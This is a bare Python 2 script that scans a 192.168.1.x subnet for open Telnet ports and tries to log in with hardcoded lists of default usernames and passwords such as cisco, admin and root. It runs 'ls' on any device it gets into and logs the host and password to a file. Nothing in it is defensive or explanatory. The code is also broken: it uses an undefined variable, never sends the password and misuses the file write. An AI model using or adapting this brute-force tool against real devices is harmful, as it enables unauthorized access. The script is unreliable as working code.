import socket
import sys, os, telnetlib
 
Passwordlist = ['Telnet', 'security','synet','tech','PASSWORD','cisco','Cisco','anicust','switch','','friend','admin','Admin','ascend','pass','root']
userlist = ['play','Telnet','telnet','root','Root','admin','Admin','','cisco','Cisco','toor']
 
ports = [23]
 
for hosts in range(256):
    for port in ports:
        try:
            host = '192.168.1.' + str(hosts)
            print "[+] Connecting to " + host + ":" + str(port)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            result = s.connect_ex((host, port))
            if result == 0:
                print "  [*] Port " + str(port) + " open!"
                print "trying passwords:"
            
            print x
            for a in userlist:
                for b in Passwordlist:
                    Host = x
                    user = a
                    password = b
                    try:
                        tn = telnetlib.Telnet(Host)
                        tn.read_until("login: ")
                        f = open('telnet.txt','w')
                        f.write(Host , password)
                        f.close()
                        tn.write(user + "\n")
                        tn.write("ls\n")
                        tn.write("exit\n")
                        print tn.read_all()
                        break
                    except:
                        print "connection error ip = " ,x  
                        print "user = " ,a
                        print "password = " ,b
                        print "\n"
                        s.close()
        except:
            pass
